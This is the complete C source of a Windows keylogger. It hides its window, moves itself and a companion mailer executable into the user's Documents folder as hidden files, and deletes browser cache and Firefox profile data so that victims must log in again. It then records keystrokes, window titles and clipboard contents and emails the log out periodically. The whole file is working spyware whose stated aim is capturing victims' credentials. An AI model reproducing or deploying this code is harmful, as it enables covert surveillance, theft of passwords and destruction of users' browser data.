#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <process.h>

// GLOBALS //
#define BUF_SIZE 256   // general purpose for buffers
#define CLIP_SIZE 5000 // 5000 characters to be copied and logged
#define LOG_TIMER 1800 // time limit until send email (3600s == 1 hour)

// FUNCTION DECLARATIONS //
char* GetTime();

// setup
void HideWindow();
void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory);
void ClearBrowserCache();
void InitLogfile(char* logfile_path);

// logging
int GetLogfileLength(char* logfile_path);
void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile);
void UpdateClipboard(char* prev_clipboard, FILE* logfile);
void KeystrokeHandler(short key, FILE* logfile);
void ExecuteMailer(char* mailer_path, char* directory);

// MAIN FUNCTION //
int main(){
    // avoid visible detection of executable window
    HideWindow();

    // delete browser-saved data
    ClearBrowserCache();

    // install executables
    char mailer_path[MAX_PATH];
    char logfile_path[MAX_PATH];
    char directory[MAX_PATH];
    InstallKeylogger(mailer_path, logfile_path, directory);

    // initialize timers
    clock_t email_timer;               // tracks against LOG_TIMER
    clock_t keystroke_timer = clock(); // resets at each keystroke

    // initialize the current window
    char window[BUF_SIZE];
    char new_window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);

    // initialize the clipboard
    char clipboard[CLIP_SIZE];

    // active program process
    while(1){

        Sleep(10); // reduce CPU usage
        
        // loop thru keyboard characters
        for(short key = 8; key <= 222; key++){
            
            // check for key press
            // where -32767 means key is pressed
            if(GetAsyncKeyState(key) == -32767){
                keystroke_timer = clock();

                // open keylog file then handle keystroke
                FILE* logfile = fopen(logfile_path, "a");
                UpdateCurrentWindow(window, new_window, clipboard, logfile);
                KeystrokeHandler(key, logfile);
                fclose(logfile);
            }
        }

        email_timer = (clock() - keystroke_timer) / CLOCKS_PER_SEC;

        // check if its time to send the email
        // no keystrokes lets email_timer time out
        if(email_timer > LOG_TIMER){
            
            // don't send empty files (5 lines is length of header)
            if(GetLogfileLength(logfile_path) > 5){
                ExecuteMailer(mailer_path, directory); // email
                InitLogfile(logfile_path);             // clear logfile
            }

            // reset timer
            keystroke_timer = clock();
        }
    }
    return 0;
}

// FUNCTION DEFINITIONS //
// get current time
char* GetTime(){
    time_t curr_time = time(NULL);
    return ctime(&curr_time);
}

// hides the executable window
void HideWindow(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); // set to 0 to not display
}

// attempt to move the executables to another directory to be "less" detectable
void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
    // get current directory
    char curr_directory[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, curr_directory);

    // create file path strings
    char keylogger_path[MAX_PATH];
    sprintf(keylogger_path, "%s\\keylogger.exe", curr_directory);
    sprintf(mailer_path, "%s\\mailer.exe", curr_directory);
    strncpy(logfile_path, "log.txt", BUF_SIZE);
    strncpy(directory, curr_directory, MAX_PATH);
    
    // get current user's name
    DWORD len = BUF_SIZE+1;
    char username[BUF_SIZE+1];
    GetUserName(username, &len);

    // build new file paths
    char keylogger_new_path[MAX_PATH];
    sprintf(keylogger_new_path, "C:\\Users\\%s\\Documents\\keylogger.exe", username);
    
    char mailer_new_path[MAX_PATH];
    sprintf(mailer_new_path, "C:\\Users\\%s\\Documents\\mailer.exe", username);
    
    char logfile_new_path[MAX_PATH];
    sprintf(logfile_new_path, "C:\\Users\\%s\\Documents\\log.txt", username);
    
    char new_directory[MAX_PATH];
    sprintf(new_directory, "C:\\Users\\%s\\Documents\\", username);

    // attempt to execute in case of failure to install files in desired spot
    // move keylogger
    BOOL moved = MoveFile(keylogger_path, keylogger_new_path);
    
    // if moved successfully, move mailer
    if(moved){

        // move mailer
        BOOL moved2 = MoveFile(mailer_path, mailer_new_path);

        // if moved successfully, update file paths and make logfile
        if(moved2){
            strncpy(keylogger_path, keylogger_new_path, MAX_PATH);
            strncpy(mailer_path, mailer_new_path, MAX_PATH);
            strncpy(logfile_path, logfile_new_path, MAX_PATH);
            strncpy(directory, new_directory, MAX_PATH);
            InitLogfile(logfile_path);
        }
        // if failed, move keylogger back and execute where it is
        else{
            MoveFile(keylogger_new_path, keylogger_path);
            InitLogfile(logfile_path);
        }
    }

    // hide the executables
    SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributes(mailer_path, FILE_ATTRIBUTE_HIDDEN);
}

// clear/delete the cache directory of each browser so victim must relog into accounts
void ClearBrowserCache(){
    char browser_path[MAX_PATH];
    char remove_command[] = "rmdir /Q /S ";
    char create_command[] = "mkdir ";

    // clear chrome
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache", 
            remove_command, 
            getenv("USERNAME"));
    system(browser_path);
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache", 
            create_command, 
            getenv("USERNAME"));
    system(browser_path);

    // clear microsoft edge
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache", 
            remove_command, 
            getenv("USERNAME"));
    system(browser_path);
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache", 
            create_command, 
            getenv("USERNAME"));
    system(browser_path);

    // clear firefox
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox", 
            remove_command, 
            getenv("USERNAME"));
    system(browser_path);
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox", 
            create_command, 
            getenv("USERNAME"));
    system(browser_path);

    // clear brave
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", 
            remove_command, 
            getenv("USERNAME"));
    system(browser_path);
    sprintf(browser_path, 
            "%sC:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", 
            create_command, 
            getenv("USERNAME"));
    system(browser_path);
}

// initialize logfile path and header
void InitLogfile(char* logfile_path){
    DWORD len = BUF_SIZE+1;
    
    // get current computer's name
    char computername[BUF_SIZE+1];
    GetComputerName(computername, &len);

    // get current user's name
    char username[BUF_SIZE+1];
    GetUserName(username, &len);

    // get foreground window
    char window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);

    // open clean logfile and print out header
    SetFileAttributes(logfile_path, FILE_ATTRIBUTE_NORMAL); // unhide for proper clearing
    FILE* logfile = fopen(logfile_path, "w");
    SetFileAttributes(logfile_path, FILE_ATTRIBUTE_HIDDEN); // rehide
    fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
    fprintf(logfile, "WINDOW: %s\nTIME: %s", window, GetTime());
    fflush(logfile);
    fclose(logfile);
}

// gets the length of the logfile
int GetLogfileLength(char* logfile_path){
    int lines = 0;
    FILE* logfile = fopen(logfile_path, "r");
    while(!feof(logfile)){
        if(fgetc(logfile) == '\n'){ 
            lines++; 
        }
    }
    return lines;
}

// update current working window of the user
void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile){
    HWND new_foreground = GetForegroundWindow();
    GetWindowText(new_foreground, window, BUF_SIZE);

    // check if window has changed/updated
    if(strcmp(window, new_window)){
        strncpy(new_window, window, BUF_SIZE);

        // if changed/updated, display current window and time
        if(!strcmp(window, new_window) && strcmp(window, "")){
            UpdateClipboard(prev_clipboard, logfile);
            fprintf(logfile, "\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
            fflush(logfile);
        }
    }
}

// update clipboard contents in logfile
void UpdateClipboard(char* prev_clipboard, FILE* logfile){
    if(OpenClipboard(NULL)){
        // picture
        if(IsClipboardFormatAvailable(CF_BITMAP)){
            fprintf(logfile, "\n\nCLIPBOARD:\n[PICTURE COPIED]\n:END CLIPBOARD");
            CloseClipboard();
        }
        // text
        else if(IsClipboardFormatAvailable(CF_TEXT)){
            HWND clipboard = GetClipboardData(CF_TEXT);
            CloseClipboard();

            // compare to previous clipboard and update logfile iff new content
            if(strcmp(prev_clipboard, (char*)clipboard) != 0){
                strncpy(prev_clipboard, (char*)clipboard, CLIP_SIZE);
                fprintf(logfile, "\n\nCLIPBOARD:\n%s\n:END CLIPBOARD", prev_clipboard);
            }
            else{
                fprintf(logfile, "\n"); // formatting purposes
            }
        }
    }
}

// writes to file the interpretation of keystroke
void KeystrokeHandler(short key, FILE* logfile){
    // upper case alphabet
    if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
        fputc(key, logfile);
    }
    // lower case alphabet
    else if(key > 64 && key < 91){
        fputc(key+32, logfile);
    }
    // special characters, virtual keys, etc.
    else{
        switch(key){    
            case VK_SPACE: fputs("[SPACE]", logfile); break;
            case VK_TAB: fputs("[TAB]", logfile); break;
            case VK_BACK: fputs("[BACKSPACE]", logfile); break;
            case VK_RETURN: fputs("[ENTER]", logfile); break;
            case VK_SHIFT: fputs("[SHIFT]", logfile); break;
            case VK_CONTROL: fputs("[CTRL]", logfile); break;
            case VK_MENU: fputs("[ALT]", logfile); break;
            case VK_DELETE: fputs("[DEL]", logfile); break;
            case VK_ESCAPE: fputs("[ESC]", logfile); break;
            case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
            case VK_OEM_1: fputs("[;:]", logfile); break;
            case VK_OEM_2: fputs("[/?]", logfile); break;
            case VK_OEM_3: fputs("[`~]", logfile); break;
            case VK_OEM_4: fputs("[ [{ ]", logfile); break;
            case VK_OEM_5: fputs("[\\|]", logfile); break;
            case VK_OEM_6: fputs("[ ]} ]", logfile); break;
            case VK_OEM_7: fputs("['\"]", logfile); break;
            case VK_LEFT: fputs("[LEFT]", logfile); break;
            case VK_UP: fputs("[UP]", logfile); break;
            case VK_RIGHT: fputs("[RIGHT]", logfile); break;
            case VK_DOWN: fputs("[DOWN]", logfile); break;
            case 187: fputc('+', logfile); break;
            case 188: fputc(',', logfile); break;
            case 189: fputc('-', logfile); break;
            case 190: fputc('.', logfile); break;
            case VK_NUMPAD0: fputc('0', logfile); break;
            case VK_NUMPAD1: fputc('1', logfile); break;
            case VK_NUMPAD2: fputc('2', logfile); break;
            case VK_NUMPAD3: fputc('3', logfile); break;
            case VK_NUMPAD4: fputc('4', logfile); break;
            case VK_NUMPAD5: fputc('5', logfile); break;
            case VK_NUMPAD6: fputc('6', logfile); break;
            case VK_NUMPAD7: fputc('7', logfile); break;
            case VK_NUMPAD8: fputc('8', logfile); break;
            case VK_NUMPAD9: fputc('9', logfile); break;
            case 48:
                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
                else{ fputc('0', logfile); }
                break;
            case 49:
                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
                else{ fputc('1', logfile); }
                break;
            case 50:
                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
                else{ fputc('2', logfile); }
                break;
            case 51:
                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
                else{ fputc('3', logfile); }
                break;
            case 52:
                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
                else{ fputc('4', logfile); }
                break;
            case 53:
                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
                else{ fputc('5', logfile); }
                break;
            case 54:
                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
                else{ fputc('6', logfile); }
                break;
            case 55:
                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
                else{ fputc('7', logfile); }
                break;
            case 56:
                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
                else{ fputc('8', logfile); }
                break;
            case 57:
                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
                else{ fputc('9', logfile); }
                break;
        }
    }
}

// executes mailer module to send logfile
void ExecuteMailer(char* mailer_path, char* directory){
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // hide new executable window
    
    // win32 version of fork() and exec()
    CreateProcess(
        mailer_path,
        NULL, NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, 
        directory,
        &si, &pi
    );

    // wait for child process to complete to prevent emailing emptied logfile
    WaitForSingleObject(&pi.hProcess, INFINITE);
    CloseHandle(&pi);
    Sleep(5000);
}